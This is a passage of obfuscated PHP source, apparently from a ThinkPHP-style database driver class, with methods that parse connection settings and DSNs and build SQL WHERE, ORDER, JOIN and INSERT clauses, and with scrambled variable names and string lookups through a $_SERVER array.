$Å”Ì“—˜($”öåÑ); if ($©›üáÂ[986] != strtolower($”öåÑ[$©›üáÂ[983]])) { $Ã‘®Ô²->dbType = strtoupper($this->dbType); } else { $Ã‘®Ô²->dbType = $this->_getDsnType($”öåÑ[$©›üáÂ[938]]); } } else { think_exception(think_lang($©›üáÂ[987]) . $©›üáÂ[988] . $Å”Ì“—˜); } return $Ã‘®Ô²; } public function __call($£½Ã¦™, $ËÓè†ç) { if (method_exists($this, $£½Ã¦™)) { return call_user_func_array(array($this, $£½Ã¦™), $ËÓè†ç); } } protected function _getDsnType($„€´Åş®) { $û¸Ù¢ù÷ = explode($_SERVER[ä¿÷‹µ±][4], $„€´Åş®); $ÂŒéŞ¨ = strtoupper(trim($û¸Ù¢ù÷[0])); return $ÂŒéŞ¨; } private function parseConfig($†ÈƒÀÙ = '') { $¬»ÇÉêÂ =& $_SERVER[ä¿÷‹µ±]; if (!empty($†ÈƒÀÙ) && is_string($†ÈƒÀÙ)) { $†ÈƒÀÙ = $this->parseDSN($†ÈƒÀÙ); } elseif (is_array($†ÈƒÀÙ)) { $†ÈƒÀÙ = array_change_key_case($†ÈƒÀÙ); $†ÈƒÀÙ = array($¬»ÇÉêÂ[983] => $†ÈƒÀÙ[$¬»ÇÉêÂ[989]], $¬»ÇÉêÂ[908] => $†ÈƒÀÙ[$¬»ÇÉêÂ[990]], $¬»ÇÉêÂ[909] => $†ÈƒÀÙ[$¬»ÇÉêÂ[991]], $¬»ÇÉêÂ[906] => $†ÈƒÀÙ[$¬»ÇÉêÂ[992]], $¬»ÇÉêÂ[907] => $†ÈƒÀÙ[$¬»ÇÉêÂ[993]], $¬»ÇÉêÂ[21] => $†ÈƒÀÙ[$¬»ÇÉêÂ[994]], $¬»ÇÉêÂ[938] => $†ÈƒÀÙ[$¬»ÇÉêÂ[995]], $¬»ÇÉêÂ[17] => isset($†ÈƒÀÙ[$¬»ÇÉêÂ[996]]) ? $†ÈƒÀÙ[$¬»ÇÉêÂ[996]] : array()); } elseif (empty($†ÈƒÀÙ)) { if (think_config($¬»ÇÉêÂ[997]) && $¬»ÇÉêÂ[986] != strtolower(think_config($¬»ÇÉêÂ[998]))) { $†ÈƒÀÙ = $this->parseDSN(think_config($¬»ÇÉêÂ[997])); } else { $†ÈƒÀÙ = array($¬»ÇÉêÂ[983] => think_config($¬»ÇÉêÂ[998]), $¬»ÇÉêÂ[908] => think_config($¬»ÇÉêÂ[999]), $¬»ÇÉêÂ[909] => think_config($¬»ÇÉêÂ[1000]), $¬»ÇÉêÂ[906] => think_config($¬»ÇÉêÂ[1001]), $¬»ÇÉêÂ[907] => think_config($¬»ÇÉêÂ[1002]), $¬»ÇÉêÂ[21] => think_config($¬»ÇÉêÂ[246]), $¬»ÇÉêÂ[938] => think_config($¬»ÇÉêÂ[997]), $¬»ÇÉêÂ[17] => think_config($¬»ÇÉêÂ[1003])); } } return $†ÈƒÀÙ; } protected function initConnect($—âıÁ›Ó = true) { if (1 == think_config($_SERVER[ä¿÷‹µ±][22])) { $this->_linkID = $this->multiConnect($—âıÁ›Ó); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¢ŞæƒÛè => $£ì÷Â) { $this->_linkID = $£ì÷Â; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($é¹”¨Ÿ‰ = false) { $¶Ø¥ëË =& $_SERVER[ä¿÷‹µ±]; static $Æ¯ø¸‡¶ = array(); static $üÚ×²¹ = -1; if (empty($Æ¯ø¸‡¶)) { foreach ($this->config as $‚Ó­“Õ„ => $ªÆ»ÖÛ) { $Æ¯ø¸‡¶[$‚Ó­“Õ„] = explode($¶Ø¥ëË[50], $ªÆ»ÖÛ); } } if (think_config($¶Ø¥ëË[1004])) { if ($é¹”¨Ÿ‰ || think_config($¶Ø¥ëË[395]) === !0) { $²Ïé­¨ = floor(mt_rand(0, think_config($¶Ø¥ëË[1005]) - 1)); $üÚ×²¹ = $²Ïé­¨; } else { if (is_numeric(think_config($¶Ø¥ëË[1006]))) { $²Ïé­¨ = think_config($¶Ø¥ëË[1006]); } else { $²Ïé­¨ = floor(mt_rand(think_config($¶Ø¥ëË[1005]), count($Æ¯ø¸‡¶[$¶Ø¥ëË[906]]) - 1)); } } } else { $²Ïé­¨ = floor(mt_rand(0, count($Æ¯ø¸‡¶[$¶Ø¥ëË[906]]) - 1)); $üÚ×²¹ = $²Ïé­¨; } $²Ïé­¨ = $üÚ×²¹ !== -1 ? $üÚ×²¹ : $²Ïé­¨; $¯¦ëïÌ = array($¶Ø¥ëË[908] => isset($Æ¯ø¸‡¶[$¶Ø¥ëË[908]][$²Ïé­¨]) ? $Æ¯ø¸‡¶[$¶Ø¥ëË[908]][$²Ïé­¨] : $Æ¯ø¸‡¶[$¶Ø¥ëË[908]][0], $¶Ø¥ëË[909] => isset($Æ¯ø¸‡¶[$¶Ø¥ëË[909]][$²Ïé­¨]) ? $Æ¯ø¸‡¶[$¶Ø¥ëË[909]][$²Ïé­¨] : $Æ¯ø¸‡¶[$¶Ø¥ëË[909]][0], $¶Ø¥ëË[906] => isset($Æ¯ø¸‡¶[$¶Ø¥ëË[906]][$²Ïé­¨]) ? $Æ¯ø¸‡¶[$¶Ø¥ëË[906]][$²Ïé­¨] : $Æ¯ø¸‡¶[$¶Ø¥ëË[906]][0], $¶Ø¥ëË[907] => isset($Æ¯ø¸‡¶[$¶Ø¥ëË[907]][$²Ïé­¨]) ? $Æ¯ø¸‡¶[$¶Ø¥ëË[907]][$²Ïé­¨] : $Æ¯ø¸‡¶[$¶Ø¥ëË[907]][0], $¶Ø¥ëË[21] => isset($Æ¯ø¸‡¶[$¶Ø¥ëË[21]][$²Ïé­¨]) ? $Æ¯ø¸‡¶[$¶Ø¥ëË[21]][$²Ïé­¨] : $Æ¯ø¸‡¶[$¶Ø¥ëË[21]][0], $¶Ø¥ëË[938] => isset($Æ¯ø¸‡¶[$¶Ø¥ëË[938]][$²Ïé­¨]) ? $Æ¯ø¸‡¶[$¶Ø¥ëË[938]][$²Ïé­¨] : $Æ¯ø¸‡¶[$¶Ø¥ëË[938]][0], $¶Ø¥ëË[17] => isset($Æ¯ø¸‡¶[$¶Ø¥ëË[17]][$²Ïé­¨]) ? $Æ¯ø¸‡¶[$¶Ø¥ëË[17]][$²Ïé­¨] : $Æ¯ø¸‡¶[$¶Ø¥ëË[17]][0]); return $this->connect($¯¦ëïÌ, $²Ïé­¨); } public function parseDSN($î¨Ë»†£) { $¥Œêå®… =& $_SERVER[ä¿÷‹µ±]; if (empty($î¨Ë»†£)) { return !1; } $üåË¹åš = parse_url($î¨Ë»†£); if ($üåË¹åš[$¥Œêå®…[180]]) { $­Íµœ¢Ç = array($¥Œêå®…[983] => $üåË¹åš[$¥Œêå®…[180]], $¥Œêå®…[908] => isset($üåË¹åš[$¥Œêå®…[600]]) ? $üåË¹åš[$¥Œêå®…[600]] : $¥Œêå®…[12], $¥Œêå®…[909] => isset($üåË¹åš[$¥Œêå®…[1007]]) ? $üåË¹åš[$¥Œêå®…[1007]] : $¥Œêå®…[12], $¥Œêå®…[906] => isset($üåË¹åš[$¥Œêå®…[181]]) ? $üåË¹åš[$¥Œêå®…[181]] : $¥Œêå®…[12], $¥Œêå®…[907] => isset($üåË¹åš[$¥Œêå®…[182]]) ? $üåË¹åš[$¥Œêå®…[182]] : $¥Œêå®…[12], $¥Œêå®…[21] => isset($üåË¹åš[$¥Œêå®…[84]]) ? substr($üåË¹åš[$¥Œêå®…[84]], 1) : $¥Œêå®…[12]); } else { preg_match($¥Œêå®…[1008], trim($î¨Ë»†£), $Ú¸›øƒ); $­Íµœ¢Ç = array($¥Œêå®…[983] => $Ú¸›øƒ[1], $¥Œêå®…[908] => $Ú¸›øƒ[2], $¥Œêå®…[909] => $Ú¸›øƒ[3], $¥Œêå®…[906] => $Ú¸›øƒ[4], $¥Œêå®…[907] => $Ú¸›øƒ[5], $¥Œêå®…[21] => $Ú¸›øƒ[6]); } $­Íµœ¢Ç[$¥Œêå®…[938]] = $¥Œêå®…[12]; return $­Íµœ¢Ç; } protected function debug() { $¬«æ®•Î =& $_SERVER[ä¿÷‹µ±]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¬«æ®•Î[1009]; if (think_config($¬«æ®•Î[1010])) { think_status($¬«æ®•Î[1011]); think_trace($this->queryStr . $¬«æ®•Î[1012] . think_status($¬«æ®•Î[24], $¬«æ®•Î[1011], 6) . $¬«æ®•Î[1013], $¬«æ®•Î[12], $¬«æ®•Î[1014]); } } protected function parseLock($‰´îã¿ = false) { $ÑÚ÷³èÊ =& $_SERVER[ä¿÷‹µ±]; if (!$‰´îã¿) { return $ÑÚ÷³èÊ[12]; } if ($ÑÚ÷³èÊ[940] == $this->dbType) { return $ÑÚ÷³èÊ[1015]; } return $ÑÚ÷³èÊ[1016]; } protected function parseSet($„½¥šÈ±) { $œ¬‘´è =& $_SERVER[ä¿÷‹µ±]; foreach ($„½¥šÈ± as $°ŸĞÁ¨  => $õ°ùœÕ) { if (is_array($õ°ùœÕ) && $œ¬‘´è[297] == $õ°ùœÕ[0]) { $Äø¯×È’[] = $this->parseKey($°ŸĞÁ¨ ) . $œ¬‘´è[904] . $õ°ùœÕ[1]; } elseif (is_scalar($õ°ùœÕ) || is_null($õ°ùœÕ)) { $Äø¯×È’[] = $this->parseKey($°ŸĞÁ¨ ) . $œ¬‘´è[904] . $this->parseValue($õ°ùœÕ); } } return $œ¬‘´è[1017] . implode($œ¬‘´è[50], $Äø¯×È’); } protected function bindParam($èÏÖ‰ò, $‡»ÀÆ¾¹) { $this->bind[$_SERVER[ä¿÷‹µ±][4] . $èÏÖ‰ò] = $‡»ÀÆ¾¹; } protected function parseBind($ªœŞşÓ) { $ªœŞşÓ = array_merge($this->bind, $ªœŞşÓ); $this->bind = array(); return $ªœŞşÓ; } function parseKey(&$¤×ëØò±, $úê”“‘‹ = true) { if ($úê”“‘‹) { $¤×ëØò± = $this->parseKeyCheck($¤×ëØò±); } return $¤×ëØò±; } function parseKeyCheck($ö—«·Æ‘) { $ƒñ¬ŞĞ¸ =& $_SERVER[ä¿÷‹µ±]; $ö—«·Æ‘ = trim($ö—«·Æ‘); if (!preg_match($ƒñ¬ŞĞ¸[1018], $ö—«·Æ‘)) { think_exception($ƒñ¬ŞĞ¸[1019] . $ö—«·Æ‘); } return $ö—«·Æ‘; } protected function parseValue($ï”µÅüŠ) { $ºææÁŒ =& $_SERVER[ä¿÷‹µ±]; if (is_string($ï”µÅüŠ)) { $ï”µÅüŠ = $ºææÁŒ[979] . $this->escapeString($ï”µÅüŠ) . $ºææÁŒ[979]; } elseif (isset($ï”µÅüŠ[0]) && is_string($ï”µÅüŠ[0]) && strtolower($ï”µÅüŠ[0]) == $ºææÁŒ[297]) { $ï”µÅüŠ = $this->escapeString($ï”µÅüŠ[1]); } elseif (is_array($ï”µÅüŠ)) { $ï”µÅüŠ = array_map(array($this, $ºææÁŒ[980]), $ï”µÅüŠ); } elseif (is_bool($ï”µÅüŠ)) { $ï”µÅüŠ = $ï”µÅüŠ ? $ºææÁŒ[88] : $ºææÁŒ[197]; } elseif (is_null($ï”µÅüŠ)) { $ï”µÅüŠ = $ºææÁŒ[103]; } return $ï”µÅüŠ; } protected function parseField($š¢ï—ø) { $Şõ”Õ•Ä =& $_SERVER[ä¿÷‹µ±]; if (is_string($š¢ï—ø) && strpos($š¢ï—ø, $Şõ”Õ•Ä[50])) { $š¢ï—ø = explode($Şõ”Õ•Ä[50], $š¢ï—ø); } if (is_array($š¢ï—ø)) { $öÀû‰Ï = array(); foreach ($š¢ï—ø as $öËí„ÊŸ => $Áø‹Ñ‰ó) { if (!is_numeric($öËí„ÊŸ)) { $öÀû‰Ï[] = $this->parseKey($öËí„ÊŸ, !1) . $Şõ”Õ•Ä[1020] . $this->parseKey($Áø‹Ñ‰ó); } else { $öÀû‰Ï[] = $this->parseKey($Áø‹Ñ‰ó); } } $Ò¨ÁÚŞ¤ = implode($Şõ”Õ•Ä[50], $öÀû‰Ï); } elseif (is_string($š¢ï—ø) && !empty($š¢ï—ø)) { $Ò¨ÁÚŞ¤ = $š¢ï—ø; } else { $Ò¨ÁÚŞ¤ = $Şõ”Õ•Ä[188]; } return $Ò¨ÁÚŞ¤; } protected function parseTable($¯¹Íß«) { $îµ¤ı¯û =& $_SERVER[ä¿÷‹µ±]; if (is_array($¯¹Íß«)) { $¾¸°éê§ = array(); foreach ($¯¹Íß« as $µ×Ÿ¸À£ => $ÏòúµëŒ) { if (!is_numeric($µ×Ÿ¸À£)) { $¾¸°éê§[] = $this->parseKey($µ×Ÿ¸À£) . $îµ¤ı¯û[53] . $this->parseKey($ÏòúµëŒ); } else { $¾¸°éê§[] = $this->parseKey($µ×Ÿ¸À£); } } $¯¹Íß« = $¾¸°éê§; } elseif (is_string($¯¹Íß«)) { if (strstr($¯¹Íß«, $îµ¤ı¯û[53])) { return $¯¹Íß«; } $¯¹Íß« = explode($îµ¤ı¯û[50], $¯¹Íß«); array_walk($¯¹Íß«, array($this, $îµ¤ı¯û[926])); } return $îµ¤ı¯û[920] . trim(implode($îµ¤ı¯û[1021], $¯¹Íß«), $îµ¤ı¯û[385]) . $îµ¤ı¯û[920]; } protected function parseWhere($ö×ˆªæ) { $ŒŸÛòÂö =& $_SERVER[ä¿÷‹µ±]; $€ˆ‹Ÿ™Â = $ŒŸÛòÂö[12]; if (is_string($ö×ˆªæ)) { $€ˆ‹Ÿ™Â = $ö×ˆªæ; } else { $ô”’…µ = isset($ö×ˆªæ[$ŒŸÛòÂö[1022]]) ? strtoupper($ö×ˆªæ[$ŒŸÛòÂö[1022]]) : $ŒŸÛòÂö[12]; if (in_array($ô”’…µ, array($ŒŸÛòÂö[1023], $ŒŸÛòÂö[1024], $ŒŸÛòÂö[1025]))) { $ô”’…µ = $ŒŸÛòÂö[53] . $ô”’…µ . $ŒŸÛòÂö[53]; unset($ö×ˆªæ[$ŒŸÛòÂö[1022]]); } else { $ô”’…µ = $ŒŸÛòÂö[1026]; } foreach ($ö×ˆªæ as $Üœø­ùú => $Ï¬•Æ®ò) { $€ˆ‹Ÿ™Â .= $ŒŸÛòÂö[277]; if (is_numeric($Üœø­ùú)) { $Üœø­ùú = $ŒŸÛòÂö[1027]; } if (0 === strpos($Üœø­ùú, $ŒŸÛòÂö[11])) { $€ˆ‹Ÿ™Â .= $this->parseThinkWhere($Üœø­ùú, $Ï¬•Æ®ò); } else { if (!preg_match($ŒŸÛòÂö[1028], trim($Üœø­ùú))) { think_exception(think_lang($ŒŸÛòÂö[1029]) . $ŒŸÛòÂö[4] . $Üœø­ùú); } $³¦ĞòÑ¼ = is_array($Ï¬•Æ®ò) && isset($Ï¬•Æ®ò[$ŒŸÛòÂö[1030]]); $Üœø­ùú = trim($Üœø­ùú); if (strpos($Üœø­ùú, $ŒŸÛòÂö[283])) { $ÁøÁÆßà = explode($ŒŸÛòÂö[283], $Üœø­ùú); $¿ÒŒ™ª£ = array(); foreach ($ÁøÁÆßà as $ğ€äİª => $²‰úØ”¢) { $ó¯Ÿ‰ìÀ = $³¦ĞòÑ¼ ? $Ï¬•Æ®ò[$ğ€äİª] : $Ï¬•Æ®ò; $¿ÒŒ™ª£[] = $ŒŸÛòÂö[260] . $this->parseWhereItem($this->parseKey($²‰úØ”¢), $ó¯Ÿ‰ìÀ) . $ŒŸÛòÂö[925]; } $€ˆ‹Ÿ™Â .= implode($ŒŸÛòÂö[1031], $¿ÒŒ™ª£); } elseif (strpos($Üœø­ùú, $ŒŸÛòÂö[284])) { $ÁøÁÆßà = explode($ŒŸÛòÂö[284], $Üœø­ùú); $¿ÒŒ™ª£ = array(); foreach ($ÁøÁÆßà as $ğ€äİª => $²‰úØ”¢) { $ó¯Ÿ‰ìÀ = $³¦ĞòÑ¼ ? $Ï¬•Æ®ò[$ğ€äİª] : $Ï¬•Æ®ò; $¿ÒŒ™ª£[] = $ŒŸÛòÂö[260] . $this->parseWhereItem($this->parseKey($²‰úØ”¢), $ó¯Ÿ‰ìÀ) . $ŒŸÛòÂö[925]; } $€ˆ‹Ÿ™Â .= implode($ŒŸÛòÂö[1026], $¿ÒŒ™ª£); } else { $€ˆ‹Ÿ™Â .= $this->parseWhereItem($this->parseKey($Üœø­ùú), $Ï¬•Æ®ò); } } $€ˆ‹Ÿ™Â .= $ŒŸÛòÂö[278] . $ô”’…µ; } $€ˆ‹Ÿ™Â = substr($€ˆ‹Ÿ™Â, 0, -strlen($ô”’…µ)); } return empty($€ˆ‹Ÿ™Â) ? $ŒŸÛòÂö[12] : $ŒŸÛòÂö[1032] . $€ˆ‹Ÿ™Â; } protected function parseWhereItem($ÅË‘ê•Ú, $ú©“áÃí) { $Ã‚ÑæúÂ =& $_SERVER[ä¿÷‹µ±]; $ÔçŞì«Å = $Ã‚ÑæúÂ[12]; if (is_array($ú©“áÃí)) { if (is_string($ú©“áÃí[0])) { $Ù˜Ô×’ˆ = strtolower($ú©“áÃí[0]); if (in_array($ú©“áÃí[0], array($Ã‚ÑæúÂ[904], $Ã‚ÑæúÂ[1033], $Ã‚ÑæúÂ[1034], $Ã‚ÑæúÂ[1035], $Ã‚ÑæúÂ[1036], $Ã‚ÑæúÂ[1037]))) { $ÔçŞì«Å .= $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $ú©“áÃí[0] . $Ã‚ÑæúÂ[53] . $this->parseValue($ú©“áÃí[1]); } elseif (preg_match($Ã‚ÑæúÂ[1038], $ú©“áÃí[0])) { $ÔçŞì«Å .= $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $this->exp[$Ù˜Ô×’ˆ] . $Ã‚ÑæúÂ[53] . $this->parseValue($ú©“áÃí[1]); } elseif (preg_match($Ã‚ÑæúÂ[1039], $ú©“áÃí[0])) { if (is_array($ú©“áÃí[1])) { $®ÉÛüÈù = isset($ú©“áÃí[2]) ? strtoupper($ú©“áÃí[2]) : $Ã‚ÑæúÂ[1024]; if (in_array($®ÉÛüÈù, array($Ã‚ÑæúÂ[1023], $Ã‚ÑæúÂ[1024], $Ã‚ÑæúÂ[1025]))) { $Ë£–ÙÜ« = array(); foreach ($ú©“áÃí[1] as $’ü›Ï¾Ö) { $Ë£–ÙÜ«[] = $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $this->exp[$Ù˜Ô×’ˆ] . $Ã‚ÑæúÂ[53] . $this->parseValue($’ü›Ï¾Ö); } $ÔçŞì«Å .= $Ã‚ÑæúÂ[260] . implode($Ã‚ÑæúÂ[53] . $®ÉÛüÈù . $Ã‚ÑæúÂ[53], $Ë£–ÙÜ«) . $Ã‚ÑæúÂ[925]; } } else { $ÔçŞì«Å .= $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $this->exp[$Ù˜Ô×’ˆ] . $Ã‚ÑæúÂ[53] . $this->parseValue($ú©“áÃí[1]); } } elseif ($Ã‚ÑæúÂ[297] == $Ù˜Ô×’ˆ) { $ÔçŞì«Å .= $Ã‚ÑæúÂ[923] . $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $ú©“áÃí[1] . $Ã‚ÑæúÂ[1040]; } elseif (preg_match($Ã‚ÑæúÂ[1041], $ú©“áÃí[0])) { $ÔçŞì«Å .= $ú©“áÃí[0]; } elseif (preg_match($Ã‚ÑæúÂ[1042], $ú©“áÃí[0])) { if (isset($ú©“áÃí[2]) && $Ã‚ÑæúÂ[297] == $ú©“áÃí[2]) { $ÔçŞì«Å .= $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $this->exp[$Ù˜Ô×’ˆ] . $Ã‚ÑæúÂ[53] . $ú©“áÃí[1]; } else { if (is_string($ú©“áÃí[1])) { $ú©“áÃí[1] = explode($Ã‚ÑæúÂ[50], $ú©“áÃí[1]); } $×»¾„÷­ = implode($Ã‚ÑæúÂ[50], $this->parseValue($ú©“áÃí[1])); $ÔçŞì«Å .= $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $this->exp[$Ù˜Ô×’ˆ] . $Ã‚ÑæúÂ[923] . $×»¾„÷­ . $Ã‚ÑæúÂ[925]; } } elseif (preg_match($Ã‚ÑæúÂ[1043], $ú©“áÃí[0])) { $öÕ™öÔ½ = is_string($ú©“áÃí[1]) ? explode($Ã‚ÑæúÂ[50], $ú©“áÃí[1]) : $ú©“áÃí[1]; $ÔçŞì«Å .= $Ã‚ÑæúÂ[923] . $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $this->exp[$Ù˜Ô×’ˆ] . $Ã‚ÑæúÂ[53] . $this->parseValue($öÕ™öÔ½[0]) . $Ã‚ÑæúÂ[1026] . $this->parseValue($öÕ™öÔ½[1]) . $Ã‚ÑæúÂ[278]; } else { think_exception(think_lang($Ã‚ÑæúÂ[1029]) . $Ã‚ÑæúÂ[4] . $ú©“áÃí[0]); } } else { $ò˜úó†í = count($ú©“áÃí); $‚»œşüé = $Ã‚ÑæúÂ[12]; if (is_string($ú©“áÃí[$ò˜úó†í - 1])) { $‚»œşüé = isset($ú©“áÃí[$ò˜úó†í - 1]) ? strtoupper($ú©“áÃí[$ò˜úó†í - 1]) : $Ã‚ÑæúÂ[12]; if (in_array($‚»œşüé, array($Ã‚ÑæúÂ[1023], $Ã‚ÑæúÂ[1024], $Ã‚ÑæúÂ[1025]))) { $ò˜úó†í = $ò˜úó†í - 1; } } else { $‚»œşüé = $Ã‚ÑæúÂ[1023]; } for ($ÒÃ‘á = 0; $ÒÃ‘á < $ò˜úó†í; $ÒÃ‘á++) { $öÕ™öÔ½ = is_array($ú©“áÃí[$ÒÃ‘á]) ? $ú©“áÃí[$ÒÃ‘á][1] : $ú©“áÃí[$ÒÃ‘á]; if ($Ã‚ÑæúÂ[297] == strtolower($ú©“áÃí[$ÒÃ‘á][0])) { $ÔçŞì«Å .= $Ã‚ÑæúÂ[260] . $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $öÕ™öÔ½ . $Ã‚ÑæúÂ[1040] . $‚»œşüé . $Ã‚ÑæúÂ[53]; } else { $ì•¨—›İ = is_array($ú©“áÃí[$ÒÃ‘á]) ? $this->exp[strtolower($ú©“áÃí[$ÒÃ‘á][0])] : $Ã‚ÑæúÂ[904]; if (!$ì•¨—›İ && is_array($ú©“áÃí[$ÒÃ‘á]) && in_array($ú©“áÃí[$ÒÃ‘á][0], array($Ã‚ÑæúÂ[904], $Ã‚ÑæúÂ[1033], $Ã‚ÑæúÂ[1034], $Ã‚ÑæúÂ[1035], $Ã‚ÑæúÂ[1036], $Ã‚ÑæúÂ[1037]))) { $ì•¨—›İ = $ú©“áÃí[$ÒÃ‘á][0]; } $ÔçŞì«Å .= $Ã‚ÑæúÂ[260] . $ÅË‘ê•Ú . $Ã‚ÑæúÂ[53] . $ì•¨—›İ . $Ã‚ÑæúÂ[53] . $this->parseValue($öÕ™öÔ½) . $Ã‚ÑæúÂ[1040] . $‚»œşüé . $Ã‚ÑæúÂ[53]; } } $ÔçŞì«Å = substr($ÔçŞì«Å, 0, -4); } } else { $ÔçŞì«Å .= $ÅË‘ê•Ú . $Ã‚ÑæúÂ[1044] . $this->parseValue($ú©“áÃí); } return $ÔçŞì«Å; } protected function parseThinkWhere($…·Ï÷´, $¨ìüâ¤Å) { $Ö‹¼…¡İ =& $_SERVER[ä¿÷‹µ±]; $ÅÈ–¥¬ = $Ö‹¼…¡İ[12]; switch ($…·Ï÷´) { case $Ö‹¼…¡İ[352]: $ÅÈ–¥¬ = $¨ìüâ¤Å; break; case $Ö‹¼…¡İ[1027]: $ÅÈ–¥¬ = is_string($¨ìüâ¤Å) ? $¨ìüâ¤Å : substr($this->parseWhere($¨ìüâ¤Å), 6); break; case $Ö‹¼…¡İ[1045]: parse_str($¨ìüâ¤Å, $—Èı–‘ú); if (isset($—Èı–‘ú[$Ö‹¼…¡İ[1022]])) { $¡Ç³±ß¿ = $Ö‹¼…¡İ[53] . strtoupper($—Èı–‘ú[$Ö‹¼…¡İ[1022]]) . $Ö‹¼…¡İ[53]; unset($—Èı–‘ú[$Ö‹¼…¡İ[1022]]); } else { $¡Ç³±ß¿ = $Ö‹¼…¡İ[1026]; } $ÚøíıÅ– = array(); foreach ($—Èı–‘ú as $éá×ƒƒ£ => $Øúã¦¤ò) { $ÚøíıÅ–[] = $this->parseKey($éá×ƒƒ£) . $Ö‹¼…¡İ[1044] . $this->parseValue($Øúã¦¤ò); } $ÅÈ–¥¬ = implode($¡Ç³±ß¿, $ÚøíıÅ–); break; } return $ÅÈ–¥¬; } protected function parseLimit($ö˜¯»äØ) { $ÍùˆæÚ =& $_SERVER[ä¿÷‹µ±]; return !empty($ö˜¯»äØ) ? $ÍùˆæÚ[51] . $ö˜¯»äØ . $ÍùˆæÚ[53] : $ÍùˆæÚ[12]; } protected function parseJoin($µ¶»ÔÉ£) { $¯ËòÎ™ı =& $_SERVER[ä¿÷‹µ±]; $ø›Ê‡ = $¯ËòÎ™ı[12]; if (!empty($µ¶»ÔÉ£)) { if (is_array($µ¶»ÔÉ£)) { foreach ($µ¶»ÔÉ£ as $Äİâ¨²Ë => $”Äº¬‘Ô) { if (!1 !== stripos($”Äº¬‘Ô, $¯ËòÎ™ı[1046])) { $ø›Ê‡ .= $¯ËòÎ™ı[53] . $”Äº¬‘Ô; } else { $ø›Ê‡ .= $¯ËòÎ™ı[1047] . $”Äº¬‘Ô; } } } else { $ø›Ê‡ .= $¯ËòÎ™ı[1047] . $µ¶»ÔÉ£; } } $ø›Ê‡ = preg_replace($¯ËòÎ™ı[1048], think_config($¯ËòÎ™ı[952]) . $¯ËòÎ™ı[1049], $ø›Ê‡); return $ø›Ê‡; } protected function parseOrder($È×œ™øÄ) { $ïôÃÍ® =& $_SERVER[ä¿÷‹µ±]; if (is_array($È×œ™øÄ)) { $ç°¼‹‡Ğ = array(); foreach ($È×œ™øÄ as $öŸİ²ÅÎ => $ä­¡„ùÁ) { if (is_numeric($öŸİ²ÅÎ)) { $ç°¼‹‡Ğ[] = $this->parseKey($ä­¡„ùÁ); } else { $ä­¡„ùÁ = in_array(strtoupper(trim($ä­¡„ùÁ)), array($ïôÃÍ®[1050], $ïôÃÍ®[1051])) ? $ïôÃÍ®[53] . $ä­¡„ùÁ : $ïôÃÍ®[12]; if (preg_match($ïôÃÍ®[1052], $öŸİ²ÅÎ)) { $ç°¼‹‡Ğ[] = $this->parseKey($öŸİ²ÅÎ) . $ä­¡„ùÁ; } else { think_exception($ïôÃÍ®[1053] . $öŸİ²ÅÎ); } } } $È×œ™øÄ = implode($ïôÃÍ®[50], $ç°¼‹‡Ğ); } return !empty($È×œ™øÄ) ? $ïôÃÍ®[1054] . $È×œ™øÄ : $ïôÃÍ®[12]; } protected function parseGroup($Ö´ûßªˆ) { $¦ä‰õñô =& $_SERVER[ä¿÷‹µ±]; return !empty($Ö´ûßªˆ) ? $¦ä‰õñô[1055] . $Ö´ûßªˆ : $¦ä‰õñô[12]; } protected function parseHaving($Â¾ÈØŒ) { $åö®šéä =& $_SERVER[ä¿÷‹µ±]; return !empty($Â¾ÈØŒ) ? $åö®šéä[1056] . $Â¾ÈØŒ : $åö®šéä[12]; } protected function parseComment($ï‹Â•˜¼) { $Í¬Ôõ»² =& $_SERVER[ä¿÷‹µ±]; return !empty($ï‹Â•˜¼) ? $Í¬Ôõ»²[1057] . $ï‹Â•˜¼ . $Í¬Ôõ»²[1058] : $Í¬Ôõ»²[12]; } protected function parseDistinct($ÙáÒÑòç) { $şƒõ–Ïç =& $_SERVER[ä¿÷‹µ±]; return !empty($ÙáÒÑòç) ? $şƒõ–Ïç[1059] : $şƒõ–Ïç[12]; } protected function parseUnion($»”¨“™é) { $«Š€ïâ =& $_SERVER[ä¿÷‹µ±]; if (empty($»”¨“™é)) { return $«Š€ïâ[12]; } if (isset($»”¨“™é[$«Š€ïâ[348]])) { $Ç—Õ¤ğ• = $«Š€ïâ[1060]; unset($»”¨“™é[$«Š€ïâ[348]]); } else { $Ç—Õ¤ğ• = $«Š€ïâ[1061]; } foreach ($»”¨“™é as $³“÷üÉó) { $ç¢‚ÓÅÍ[] = $Ç—Õ¤ğ• . (is_array($³“÷üÉó) ? $this->buildSelectSql($³“÷üÉó) : $³“÷üÉó); } return implode($«Š€ïâ[53], $ç¢‚ÓÅÍ); } public function insert($»ßç¦ßï, $óØ–Ÿ¡à = array(), $‰Û–¦ê† = false) { $ÖÉ´ø³š =& $_SERVER[ä¿÷‹µ±]; $êß·É—Â = $ÄÅìÒÔ® = array(); $this->model = $óØ–Ÿ¡à[$ÖÉ´ø³š[281]]; foreach ($»ßç¦ßï as $»íé€¦× => $‹ò•´ËÆ) { if (is_array($‹ò•´ËÆ) && $ÖÉ´ø³š[297] == $‹ò•´ËÆ[0]) { $ÄÅìÒÔ®[] = $this->parseKey($»íé€¦×); $êß·É—Â[] = $‹ò•´ËÆ[1]; } elseif (is_scalar($‹ò•´ËÆ) || is_null($‹ò•´ËÆ)) { $ÄÅìÒÔ®[] = $this->parseKey($»íé€¦×); $êß·É—Â[] = $this->parseValue($‹ò•´ËÆ); } } $²¼‰«†Ñ = ($‰Û–¦ê† ? $ÖÉ´ø³š[927] : $ÖÉ´ø³š[928]) . $ÖÉ´ø³š[929] . $this->parseTable($óØ–Ÿ¡à[$ÖÉ´ø³š[279]]) . $ÖÉ´ø³š[923] . implode($ÖÉ´ø³š[50], $ÄÅìÒÔ®) . $ÖÉ´ø³š[924] . implode($ÖÉ´ø³š[50], $êß·É—Â) . 